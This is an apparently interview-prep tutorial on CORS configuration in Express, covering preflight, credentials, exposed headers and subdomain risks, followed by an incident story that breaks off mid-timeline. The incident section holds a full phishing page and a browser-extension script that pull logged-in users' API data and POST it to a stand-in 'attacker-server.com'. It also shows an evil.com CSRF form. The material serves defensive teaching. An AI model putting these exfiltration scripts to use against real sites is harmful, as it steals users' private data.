# Cross-Origin Resource Sharing (CORS) Configuration

> **Focus**: Web Security fundamentals and cross-origin communication

---

## Question 1: What is CORS and how do you configure it securely?

**Difficulty:** 🔴 Hard
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 15-20 minutes
**Companies:** Google, Meta, Amazon, Microsoft, Netflix, Stripe

### Question
Explain CORS, preflight requests, and how to configure CORS headers securely for APIs while understanding the security implications.

### Answer

**Cross-Origin Resource Sharing (CORS)** is a security mechanism that allows or restricts web applications running at one origin (domain) to access resources from a different origin. It uses HTTP headers to tell browsers whether to allow cross-origin requests.

**Why CORS Exists:**

Without CORS, Same-Origin Policy (SOP) would prevent any cross-origin HTTP requests from JavaScript. CORS provides a controlled way to relax this restriction when needed, while maintaining security.

**Key Concepts:**

1. **Origin**: Protocol + Domain + Port
   - Same origin: `https://example.com:443/page1` and `https://example.com:443/page2`
   - Different origins: `https://example.com` vs `http://example.com` (protocol differs)

2. **Simple Requests**: Don't require preflight
   - Methods: GET, HEAD, POST
   - Headers: Accept, Accept-Language, Content-Language, Content-Type (limited values)
   - Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`

3. **Preflighted Requests**: Require OPTIONS preflight
   - Other methods: PUT, DELETE, PATCH
   - Custom headers: Authorization, X-API-Key, etc.
   - Content-Type: `application/json`

### Code Example

**Understanding CORS Errors:**

```javascript
// ❌ CORS ERROR SCENARIO

// Frontend (running on https://app.com)
fetch('https://api.example.com/users')
  .then(res => res.json())
  .then(data => console.log(data))
  .catch(err => console.error(err));

// Browser console error:
// "Access to fetch at 'https://api.example.com/users' from origin 'https://app.com'
//  has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is
//  present on the requested resource."

// What happened:
// 1. Browser sends request to api.example.com
// 2. Server responds with data
// 3. Browser checks: Does response have Access-Control-Allow-Origin header?
// 4. No header found → Browser blocks response from reaching JavaScript
// 5. JavaScript sees error (even though server successfully processed request!)


// Backend (api.example.com) - NO CORS HEADERS
app.get('/users', (req, res) => {
  // ❌ Missing CORS headers!
  res.json({ users: [...] });
});

// Response headers (missing CORS):
// HTTP/1.1 200 OK
// Content-Type: application/json
// (No Access-Control-Allow-Origin header!)

// Browser blocks response because origin not allowed
```

**Basic CORS Configuration:**

```javascript
// ✅ ALLOW ALL ORIGINS (Development only - NOT production!)

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*'); // ⚠️ Insecure!
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});

// Problems with '*':
// - Allows ANY website to access your API
// - Cannot use credentials (cookies) with '*'
// - No protection against malicious sites


// ✅ ALLOW SPECIFIC ORIGIN (Better)

app.use((req, res, next) => {
  const allowedOrigin = 'https://app.com';
  res.setHeader('Access-Control-Allow-Origin', allowedOrigin);
  res.setHeader('Access-Control-Allow-Credentials', 'true'); // Allow cookies
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  next();
});


// ✅ ALLOW MULTIPLE ORIGINS (Dynamic)

app.use((req, res, next) => {
  const allowedOrigins = [
    'https://app.com',
    'https://www.app.com',
    'https://mobile.app.com',
    'http://localhost:3000' // Development
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With');
  res.setHeader('Access-Control-Max-Age', '86400'); // 24 hours preflight cache

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.sendStatus(204); // No content
  }

  next();
});
```

**Preflight Requests (OPTIONS):**

```javascript
// SCENARIO: Frontend makes POST request with JSON

// Frontend (https://app.com):
fetch('https://api.example.com/users', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token123'
  },
  body: JSON.stringify({ name: 'John' })
});

// Browser behavior:
// 1. Detects "complex" request (JSON + Authorization header)
// 2. Sends PREFLIGHT request FIRST

// PREFLIGHT REQUEST (automatic, browser-sent):
OPTIONS /users HTTP/1.1
Host: api.example.com
Origin: https://app.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type, authorization

// Server must respond to OPTIONS:
app.options('/users', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.com');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400'); // Cache for 24 hours
  res.sendStatus(204);
});

// PREFLIGHT RESPONSE:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Max-Age: 86400

// 3. Browser checks preflight response:
//    - Is app.com allowed? ✅
//    - Is POST method allowed? ✅
//    - Are Content-Type and Authorization headers allowed? ✅

// 4. ACTUAL REQUEST sent:
POST /users HTTP/1.1
Host: api.example.com
Origin: https://app.com
Content-Type: application/json
Authorization: Bearer token123

{ "name": "John" }

// 5. ACTUAL RESPONSE:
HTTP/1.1 201 Created
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Credentials: true
Content-Type: application/json

{ "id": 123, "name": "John" }

// 6. Browser allows JavaScript to read response ✅
```

**Using CORS Middleware (Express):**

```javascript
// ✅ PRODUCTION-READY CORS CONFIGURATION

const cors = require('cors');

// Option 1: Simple configuration
const corsOptions = {
  origin: 'https://app.com',
  credentials: true, // Allow cookies
  optionsSuccessStatus: 204
};

app.use(cors(corsOptions));


// Option 2: Dynamic origin validation
const corsOptions = {
  origin: function (origin, callback) {
    const allowedOrigins = [
      'https://app.com',
      'https://www.app.com',
      'https://mobile.app.com'
    ];

    // Allow requests with no origin (mobile apps, Postman, etc.)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Number'], // Headers JS can read
  maxAge: 86400 // 24 hours
};

app.use(cors(corsOptions));


// Option 3: Route-specific CORS
app.get('/public-data', cors(), (req, res) => {
  // Allow all origins for this endpoint only
  res.json({ data: 'public' });
});

app.get('/private-data', cors(corsOptions), (req, res) => {
  // Restricted CORS for this endpoint
  res.json({ data: 'private' });
});


// Option 4: Conditional CORS (environment-based)
const isDevelopment = process.env.NODE_ENV === 'development';

const corsOptions = {
  origin: isDevelopment
    ? true // Allow all origins in development
    : ['https://app.com', 'https://www.app.com'], // Restrict in production
  credentials: true
};

app.use(cors(corsOptions));
```

**CORS with Credentials (Cookies):**

```javascript
// IMPORTANT: Credentials require specific configuration

// ❌ WRONG: Cannot use '*' with credentials
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
// Browser error: "Cannot use wildcard in Access-Control-Allow-Origin when
//                 credentials flag is true"


// ✅ CORRECT: Specific origin with credentials
res.setHeader('Access-Control-Allow-Origin', 'https://app.com');
res.setHeader('Access-Control-Allow-Credentials', 'true');

// Frontend must also set credentials:
fetch('https://api.example.com/users', {
  credentials: 'include', // ✅ Send cookies cross-origin
  headers: {
    'Content-Type': 'application/json'
  }
});

// Cookies are now included in request:
GET /users HTTP/1.1
Host: api.example.com
Origin: https://app.com
Cookie: sessionId=abc123

// Server receives cookies, can use for authentication
app.get('/users', (req, res) => {
  const sessionId = req.cookies.sessionId;
  // Authenticate user...
  res.json({ users: [...] });
});
```

**Exposed Headers:**

```javascript
// By default, JavaScript can only read these response headers:
// - Cache-Control
// - Content-Language
// - Content-Length
// - Content-Type
// - Expires
// - Last-Modified
// - Pragma

// Custom headers are HIDDEN from JavaScript unless exposed:

// Backend:
app.get('/users', (req, res) => {
  res.setHeader('X-Total-Count', '1000'); // Custom header
  res.setHeader('X-Page-Number', '1');
  res.setHeader('Access-Control-Allow-Origin', 'https://app.com');

  // ❌ Without exposing, JS cannot read these headers
  res.json({ users: [...] });
});

// Frontend:
fetch('https://api.example.com/users')
  .then(res => {
    console.log(res.headers.get('X-Total-Count')); // null ❌
  });


// ✅ EXPOSE CUSTOM HEADERS:
app.get('/users', (req, res) => {
  res.setHeader('X-Total-Count', '1000');
  res.setHeader('X-Page-Number', '1');
  res.setHeader('Access-Control-Allow-Origin', 'https://app.com');
  res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count, X-Page-Number');

  res.json({ users: [...] });
});

// Frontend:
fetch('https://api.example.com/users')
  .then(res => {
    console.log(res.headers.get('X-Total-Count')); // "1000" ✅
    console.log(res.headers.get('X-Page-Number'));  // "1" ✅
  });
```

**Comprehensive CORS Security Configuration:**

```javascript
// ✅ PRODUCTION-GRADE CORS SETUP

class CORSManager {
  constructor(options = {}) {
    this.allowedOrigins = options.allowedOrigins || [];
    this.allowedMethods = options.allowedMethods || ['GET', 'POST', 'PUT', 'DELETE'];
    this.allowedHeaders = options.allowedHeaders || ['Content-Type', 'Authorization'];
    this.exposedHeaders = options.exposedHeaders || [];
    this.maxAge = options.maxAge || 86400; // 24 hours
    this.credentials = options.credentials !== false;
  }

  // Validate origin
  isOriginAllowed(origin) {
    if (!origin) return true; // Allow requests with no origin (mobile, Postman)

    // Check exact match
    if (this.allowedOrigins.includes(origin)) return true;

    // Check regex patterns
    return this.allowedOrigins.some(allowed => {
      if (allowed instanceof RegExp) {
        return allowed.test(origin);
      }
      return false;
    });
  }

  // Set CORS headers
  setCORSHeaders(req, res) {
    const origin = req.headers.origin;

    if (this.isOriginAllowed(origin)) {
      // Allow origin
      res.setHeader('Access-Control-Allow-Origin', origin || '*');

      // Allow credentials
      if (this.credentials) {
        res.setHeader('Access-Control-Allow-Credentials', 'true');
      }

      // Preflight headers
      if (req.method === 'OPTIONS') {
        res.setHeader('Access-Control-Allow-Methods', this.allowedMethods.join(', '));
        res.setHeader('Access-Control-Allow-Headers', this.allowedHeaders.join(', '));
        res.setHeader('Access-Control-Max-Age', this.maxAge.toString());
      }

      // Expose custom headers
      if (this.exposedHeaders.length > 0) {
        res.setHeader('Access-Control-Expose-Headers', this.exposedHeaders.join(', '));
      }
    } else {
      // Origin not allowed - don't set CORS headers
      console.warn(`CORS: Blocked origin ${origin}`);
    }
  }

  // Middleware
  middleware() {
    return (req, res, next) => {
      this.setCORSHeaders(req, res);

      // Handle preflight
      if (req.method === 'OPTIONS') {
        return res.sendStatus(204);
      }

      next();
    };
  }
}

// Usage:
const corsManager = new CORSManager({
  allowedOrigins: [
    'https://app.com',
    'https://www.app.com',
    /^https:\/\/[\w-]+\.app\.com$/, // Regex: subdomains of app.com
    process.env.NODE_ENV === 'development' ? 'http://localhost:3000' : null
  ].filter(Boolean),
  allowedMethods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-API-Key'],
  exposedHeaders: ['X-Total-Count', 'X-RateLimit-Remaining'],
  credentials: true,
  maxAge: 86400
});

app.use(corsManager.middleware());


// SECURITY BEST PRACTICES:

// 1. Environment-specific configuration
const allowedOrigins = {
  development: [
    'http://localhost:3000',
    'http://localhost:3001',
    'http://127.0.0.1:3000'
  ],
  staging: [
    'https://staging.app.com'
  ],
  production: [
    'https://app.com',
    'https://www.app.com',
    'https://mobile.app.com'
  ]
};

const currentOrigins = allowedOrigins[process.env.NODE_ENV] || allowedOrigins.production;


// 2. Logging for security monitoring
app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin && !allowedOrigins.includes(origin)) {
    console.warn('CORS: Blocked request', {
      timestamp: new Date().toISOString(),
      origin,
      method: req.method,
      path: req.path,
      ip: req.ip,
      userAgent: req.headers['user-agent']
    });
  }

  next();
});


// 3. Rate limiting by origin
const originRateLimits = new Map();

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin) {
    const current = originRateLimits.get(origin) || { count: 0, resetAt: Date.now() + 60000 };

    if (Date.now() > current.resetAt) {
      current.count = 0;
      current.resetAt = Date.now() + 60000;
    }

    current.count++;
    originRateLimits.set(origin, current);

    if (current.count > 1000) { // 1000 requests per minute
      console.warn(`CORS: Rate limit exceeded for origin ${origin}`);
      return res.status(429).json({ error: 'Too many requests' });
    }
  }

  next();
});


// 4. CORS error handling
app.use((err, req, res, next) => {
  if (err.message === 'Not allowed by CORS') {
    return res.status(403).json({
      error: 'CORS policy violation',
      message: 'Origin not allowed'
    });
  }
  next(err);
});
```

### Common Mistakes

❌ **Wrong**: Using `Access-Control-Allow-Origin: *` in production
```javascript
res.setHeader('Access-Control-Allow-Origin', '*'); // ⚠️ Security risk!
// Anyone can access your API
```

✅ **Correct**: Whitelist specific origins
```javascript
const allowedOrigins = ['https://app.com', 'https://www.app.com'];
if (allowedOrigins.includes(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}
```

❌ **Wrong**: Forgetting preflight for OPTIONS requests
```javascript
app.post('/users', (req, res) => {
  // ❌ No OPTIONS handler - preflight fails
});
```

✅ **Correct**: Handle OPTIONS preflight
```javascript
app.options('/users', cors()); // Preflight
app.post('/users', cors(), (req, res) => {
  // Actual request
});
```

❌ **Wrong**: Not exposing custom headers
```javascript
res.setHeader('X-Total-Count', '1000');
// ❌ JS cannot read this header!
```

✅ **Correct**: Expose custom headers
```javascript
res.setHeader('X-Total-Count', '1000');
res.setHeader('Access-Control-Expose-Headers', 'X-Total-Count');
```

<details>
<summary><strong>🔍 Deep Dive: CORS Security Model & Browser Implementation</strong></summary>

**How Browsers Enforce CORS:**

CORS is enforced by the browser, not the server. Understanding this is crucial:

```javascript
// CRITICAL INSIGHT: Server always processes the request!
// CORS only controls whether JavaScript can READ the response

// Example: DELETE request

// Frontend (https://app.com):
fetch('https://api.example.com/users/123', {
  method: 'DELETE'
});

// What actually happens:

// 1. Browser sends OPTIONS preflight:
OPTIONS /users/123 HTTP/1.1
Host: api.example.com
Origin: https://app.com
Access-Control-Request-Method: DELETE

// 2. Server responds (no CORS headers):
HTTP/1.1 200 OK
// Missing: Access-Control-Allow-Origin

// 3. Browser blocks actual DELETE request (CORS error)
// Result: User deleted? NO ✅


// BUT: If server doesn't check OPTIONS properly:

// Backend (VULNERABLE):
app.delete('/users/:id', (req, res) => {
  // ❌ No CORS check, just processes delete!
  db.users.delete({ id: req.params.id });
  res.json({ success: true });
});

// Some browsers send DELETE directly without preflight (rare)
// Or server might accept simple requests (GET/POST) for destructive actions

// Attack scenario:
// 1. Attacker uses simple POST to trigger delete
// 2. No preflight required for simple requests
// 3. Server processes request
// 4. Browser blocks response, but damage done!

// DEFENSE: Always validate origin on server-side for sensitive operations
```

**CORS vs CSRF Relationship:**

```javascript
// IMPORTANT: CORS does NOT prevent CSRF!

// Scenario: Form submission (simple request)

// Attacker's page (evil.com):
<form action="https://api.example.com/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>

// Browser behavior:
// 1. Sends POST request (simple request, no preflight)
POST /transfer HTTP/1.1
Host: api.example.com
Origin: https://evil.com
Content-Type: application/x-www-form-urlencoded
Cookie: sessionId=abc123

to=attacker&amount=1000

// 2. Server processes request (sees valid session cookie)
// 3. Money transferred!
// 4. Server responds:
HTTP/1.1 200 OK
// No Access-Control-Allow-Origin header

// 5. Browser blocks response (CORS error)
// BUT: Request already executed! Money already transferred!

// WHY CORS DOESN'T PREVENT CSRF:
// - Simple requests (form POST) bypass preflight
// - Server executes before CORS check
// - Attacker doesn't need response

// DEFENSE: Use CSRF tokens, not CORS
```

**Preflight Caching:**

```javascript
// Browsers cache preflight responses to improve performance

// First request:
OPTIONS /users HTTP/1.1
Access-Control-Request-Method: POST

// Response:
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Max-Age: 86400  // Cache for 24 hours

// Subsequent requests within 24 hours:
// - No preflight sent (uses cached result)
// - Directly sends actual request

// This improves performance but has security implications:

// Scenario: Origin revoked after preflight cached
// 1. app.com makes request → Preflight cached (24 hours)
// 2. Admin removes app.com from allowedOrigins
// 3. app.com makes another request → Uses cached preflight (still allowed!)
// 4. Request succeeds for up to 24 hours after revocation

// DEFENSE:
// - Use shorter maxAge for frequently changing origins
// - Force users to clear cache after origin changes
// - Use dynamic origin validation (checks every request)

// Example: Short cache for sensitive operations
app.options('/admin/*', (req, res) => {
  res.setHeader('Access-Control-Max-Age', '600'); // 10 minutes only
  res.sendStatus(204);
});
```

**Wildcard Subdomains:**

```javascript
// PROBLEM: Cannot use wildcard in Access-Control-Allow-Origin

// ❌ This doesn't work:
res.setHeader('Access-Control-Allow-Origin', 'https://*.app.com');
// Browser doesn't support wildcards

// ✅ SOLUTION 1: Regex validation (dynamic origin)
const allowedOriginPattern = /^https:\/\/[\w-]+\.app\.com$/;

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin && allowedOriginPattern.test(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  next();
});

// Allows: https://blog.app.com, https://shop.app.com, https://api.app.com
// Blocks: https://evil.com, https://app.com.evil.com


// ✅ SOLUTION 2: Maintain list of subdomains
const baseAllowedDomains = ['app.com', 'example.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  if (origin) {
    try {
      const url = new URL(origin);
      const hostname = url.hostname;

      // Check if hostname ends with allowed domain
      const isAllowed = baseAllowedDomains.some(domain =>
        hostname === domain || hostname.endsWith(`.${domain}`)
      );

      if (isAllowed && url.protocol === 'https:') {
        res.setHeader('Access-Control-Allow-Origin', origin);
      }
    } catch (e) {
      // Invalid origin URL
    }
  }

  next();
});


// SECURITY WARNING: Subdomain attacks

// If attacker controls subdomain (e.g., user-generated content subdomain):
// https://attacker-uploads.app.com

// And regex allows *.app.com:
// - Attacker can make authenticated requests to API
// - Steal user data via CORS

// DEFENSE:
// - Don't host user-generated content on subdomains
// - Use separate domain for UGC: https://ugc.example-cdn.com
// - Or: Explicitly whitelist subdomains (no regex)
const allowedOrigins = [
  'https://www.app.com',
  'https://blog.app.com',
  'https://shop.app.com'
  // Don't include: https://uploads.app.com (UGC)
];
```

**CORS and Cookies:**

```javascript
// Cookie behavior with CORS:

// Scenario 1: Simple request WITHOUT credentials
fetch('https://api.example.com/data', {
  credentials: 'omit' // Default for cross-origin
});

// Request:
GET /data HTTP/1.1
Host: api.example.com
Origin: https://app.com
// NO Cookie header

// Server response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.com
// Cookies not sent, not received


// Scenario 2: Request WITH credentials
fetch('https://api.example.com/data', {
  credentials: 'include' // ✅ Include cookies
});

// Request:
GET /data HTTP/1.1
Host: api.example.com
Origin: https://app.com
Cookie: sessionId=abc123 // ✅ Cookies sent

// Server response MUST include:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.com  // ✅ Specific origin
Access-Control-Allow-Credentials: true        // ✅ Required!

// ❌ This WON'T work with credentials:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
// Error: "Cannot use wildcard in Access-Control-Allow-Origin when credentials flag is true"


// COOKIE SAMESITE INTERACTION:

// SameSite=Strict cookie:
Set-Cookie: session=abc; SameSite=Strict

// Cross-origin request:
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Cookie NOT sent (SameSite=Strict blocks it)
// Even if CORS allows it, SameSite takes precedence


// SameSite=None cookie (cross-site):
Set-Cookie: session=abc; SameSite=None; Secure

// Cross-origin request:
fetch('https://api.example.com/data', {
  credentials: 'include'
});

// Cookie sent ✅ (if CORS allows)
// Requires Secure flag (HTTPS only)
```

**CORS Preflight Optimization:**

```javascript
// Reduce preflight overhead for high-traffic APIs

// Strategy 1: Maximize cache duration
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Max-Age', '86400'); // 24 hours
  res.sendStatus(204);
});

// Strategy 2: Use simple requests when possible
// Simple request (no preflight):
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'key=value'
});

// Complex request (preflight required):
fetch('/api/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json' // Triggers preflight
  },
  body: JSON.stringify({ key: 'value' })
});

// Trade-off: Simple requests avoid preflight but less flexible


// Strategy 3: Batch requests
// Instead of:
// - 10 separate API calls = 10 preflights (if not cached)

// Do:
// - 1 batch API call = 1 preflight

fetch('/api/batch', {
  method: 'POST',
  body: JSON.stringify({
    requests: [
      { endpoint: '/users', method: 'GET' },
      { endpoint: '/posts', method: 'GET' },
      // ... 8 more
    ]
  })
});


// Strategy 4: Proxy API requests through same origin
// Instead of: app.com → api.example.com (CORS needed)
// Do: app.com → app.com/api → api.example.com (no CORS)

// Frontend:
fetch('/api/users'); // Same-origin, no CORS

// Backend proxy (app.com):
app.get('/api/*', (req, res) => {
  const apiPath = req.path.replace('/api', '');
  // Forward to actual API
  fetch(`https://api.example.com${apiPath}`)
    .then(response => response.json())
    .then(data => res.json(data));
});

// Pros: No CORS issues, centralized API gateway
// Cons: Extra hop, proxy maintenance
```

**Browser Differences & Edge Cases:**

```javascript
// Not all browsers handle CORS identically

// Edge case 1: Null origin
// Occurs in: file://, data: URLs, sandboxed iframes
fetch('https://api.example.com/data');

// Request:
Origin: null

// Server must explicitly allow null:
if (req.headers.origin === 'null') {
  res.setHeader('Access-Control-Allow-Origin', 'null');
}

// Security risk: Attacker can easily fake null origin
// Better: Reject null origins in production


// Edge case 2: Redirects
// Initial request: app.com → api.example.com/redirect
// Redirect: api.example.com/redirect → api.example.com/data

// If redirect changes origin, CORS headers must be on redirect response too!

app.get('/redirect', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.com'); // ✅ Required!
  res.redirect('/data');
});

app.get('/data', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://app.com');
  res.json({ data: 'value' });
});


// Edge case 3: Opaque responses
fetch('https://api.example.com/data', { mode: 'no-cors' });

// Response is "opaque":
// - status: 0
// - headers: empty
// - body: inaccessible

// Useful for: Loading images, scripts (not data)
<img src="https://example.com/image.jpg"> // Works without CORS
fetch('https://example.com/image.jpg', { mode: 'no-cors' });
// Can fetch, but can't read response


// Edge case 4: Vary header
// Cache must vary by Origin header

app.get('/data', (req, res) => {
  res.setHeader('Vary', 'Origin'); // ✅ Important!
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
  res.json({ data: 'value' });
});

// Why: CDN/proxy caches should serve different responses
// for different origins (not cache one origin's response for all)
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: CORS Misconfiguration Exposing API</strong></summary>

**Scenario**: Your team built a SaaS analytics platform with a REST API used by 500+ enterprise customers. A security researcher discovers that your API's overly permissive CORS configuration allows any website to access customer data, potentially exposing sensitive analytics data from Fortune 500 companies.

**Production Metrics (Before Discovery):**
- API endpoints: 150+
- Daily API requests: 50 million
- Enterprise customers: 547
- CORS configuration: `Access-Control-Allow-Origin: *` (all endpoints)
- Credentials: Enabled (cookies for authentication)
- Time vulnerable: 8 months (since v2.0 API launch)
- Estimated potential data exposure: 547 companies, 2.3TB sensitive data

**The Vulnerability:**

```javascript
// ❌ VULNERABLE CODE (Production API - 8 months)

// Backend: CORS middleware (api.saas.com)
app.use((req, res, next) => {
  // ❌ CRITICAL: Allows ALL origins!
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  // ❌ CRITICAL: Credentials with wildcard (browsers should block, but some don't)
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }
  next();
});

// API endpoints (all vulnerable):
app.get('/api/analytics/revenue', authenticateUser, async (req, res) => {
  // Returns sensitive revenue data
  const data = await db.analytics.getRevenue(req.user.companyId);
  res.json(data); // ❌ Accessible from ANY origin
});

app.get('/api/users', authenticateUser, async (req, res) => {
  // Returns user list with emails
  const users = await db.users.find({ companyId: req.user.companyId });
  res.json(users); // ❌ Exposed to any site
});

app.get('/api/customers/:id', authenticateUser, async (req, res) => {
  // Returns customer PII
  const customer = await db.customers.findById(req.params.id);
  res.json(customer); // ❌ PII accessible from anywhere
});


// WHY THIS IS DANGEROUS:

// The Fetch spec forbids combining Access-Control-Allow-Origin: *
// with Access-Control-Allow-Credentials: true — all modern browsers
// reject this combination and fail the credentialed request.
// But that client-side check isn't a substitute for server-side origin
// validation:
// - Non-browser clients (mobile apps, desktop apps, curl, server-to-server
//   requests) don't enforce CORS at all — they'll happily read the response
// - A misconfigured server sending '*' still exposes non-credentialed
//   endpoints (or any endpoint reachable via cookies set with SameSite=None)
//   to every origin on the web
```

**The Attack:**

```javascript
// ATTACKER'S EXPLOIT (phishing-site.com)

<!DOCTYPE html>
<html>
<head>
  <title>Free Analytics Report - Click to Download</title>
</head>
<body>
  <h1>Your Free Analytics Report is Ready!</h1>
  <button id="download">Download Report</button>

  <script>
    // Wait for user click (social engineering)
    document.getElementById('download').addEventListener('click', async () => {
      try {
        // Attempt to steal data from vulnerable API
        const response = await fetch('https://api.saas.com/api/analytics/revenue', {
          credentials: 'include', // Include victim's cookies
          headers: {
            'Content-Type': 'application/json'
          }
        });

        if (response.ok) {
          const data = await response.json();

          // Exfiltrate stolen data
          await fetch('https://attacker-server.com/collect', {
            method: 'POST',
            body: JSON.stringify({
              victim: window.location.href,
              stolenData: data,
              timestamp: new Date().toISOString()
            })
          });

          console.log('Data stolen:', data);
          alert('Report downloaded! Check your Downloads folder.');
        } else {
          alert('Error: Please log in to SaaS Analytics first.');
        }
      } catch (err) {
        console.error('Attack failed:', err);
      }
    });


    // ADVANCED ATTACK: Automated data exfiltration

    async function stealAllData() {
      const endpoints = [
        '/api/analytics/revenue',
        '/api/analytics/traffic',
        '/api/analytics/conversions',
        '/api/users',
        '/api/customers',
        '/api/projects',
        '/api/integrations',
        '/api/billing'
      ];

      const stolen = {};

      for (const endpoint of endpoints) {
        try {
          const response = await fetch(`https://api.saas.com${endpoint}`, {
            credentials: 'include'
          });

          if (response.ok) {
            stolen[endpoint] = await response.json();
          }
        } catch (err) {
          console.error(`Failed to steal ${endpoint}`);
        }
      }

      // Send all stolen data to attacker
      await fetch('https://attacker-server.com/bulk-collect', {
        method: 'POST',
        body: JSON.stringify(stolen)
      });

      return stolen;
    }

    // Execute on page load (silent, no user interaction)
    stealAllData();
  </script>
</body>
</html>


// ATTACK VECTOR 2: Malicious browser extension

// chrome-extension://malicious-id/background.js
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  // Check if user visits SaaS platform
  if (tab.url && tab.url.includes('saas.com')) {
    // User is logged in, steal data
    fetch('https://api.saas.com/api/analytics/revenue', {
      credentials: 'include'
    })
    .then(res => res.json())
    .then(data => {
      // Send to attacker server
      fetch('https://attacker-server.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
  }
});

// Extension can make requests from privileged context
// CORS restrictions don't apply the same way
```

**Discovery & Response Timeline:**

```javascript
// TUESDAY, 10:00 AM: Security researcher finds vulnerability
// - Researcher testing API discovers CORS misconfiguration
// - Tests with proof-of-concept (PoC) HTML page
// - Confirms data exfiltration possible

// Email to security@saas.com:
// "Subject: Critical CORS vulnerability allows data theft"
// "Your API allows any origin (*) with credentials, exposing all customer data..."
// Includes PoC HTML demonstrating revenue data theft

// TUESDAY, 10:30 AM: Security team validates
const testCORS = async () => {
  // Run PoC from test page
  const response = await fetch('https://api.saas.com/api/analytics/revenue', {
    credentials: 'include'
  });

  console.log('CORS headers:', {
    origin: response.headers.get('access-control-allow-origin'),
    credentials: response.headers.get('access-control-allow-credentials')
  });

  // Result:
  // origin: "*"
  // credentials: "true"
  // CONFIRMED: Critical vulnerability ✅
};

// TUESDAY, 11:00 AM: EMERGENCY RESPONSE ACTIVATED

// Immediate actions:
console.log('[CRITICAL] CORS vulnerability - Emergency patch deployment');

// Step 1: Deploy emergency fix (HOT PATCH)
// Replace wildcard with strict origin validation

// ✅ EMERGENCY PATCH:
const allowedOrigins = [
  'https://app.saas.com',
  'https://www.saas.com',
  'https://dashboard.saas.com',
  'https://mobile.saas.com'
];

app.use((req, res, next) => {
  const origin = req.headers.origin;

  // Only allow whitelisted origins
  if (origin && allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
  } else if (origin) {
    // Log blocked origins for monitoring
    console.warn('CORS: Blocked origin', {
      origin,
      ip: req.ip,
      path: req.path,
      userAgent: req.headers['user-agent']
    });
  }

  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (req.method === 'OPTIONS') {
    return res.sendStatus(204);
  }

  next();
});

// TUESDAY, 11:45 AM: Patch deployed to production
// - All API servers restarted
// - CORS now restricted to company origins only
// - Monitoring enabled for blocked origins

// TUESDAY, 12:00 PM: Validation
const validateFix = async () => {
  // Test from external origin (should fail)
  const response = await fetch('https://api.saas.com/api/analytics/revenue', {
    credentials: 'include'
  });

  console.log('CORS headers:', response.headers.get('access-control-allow-origin'));
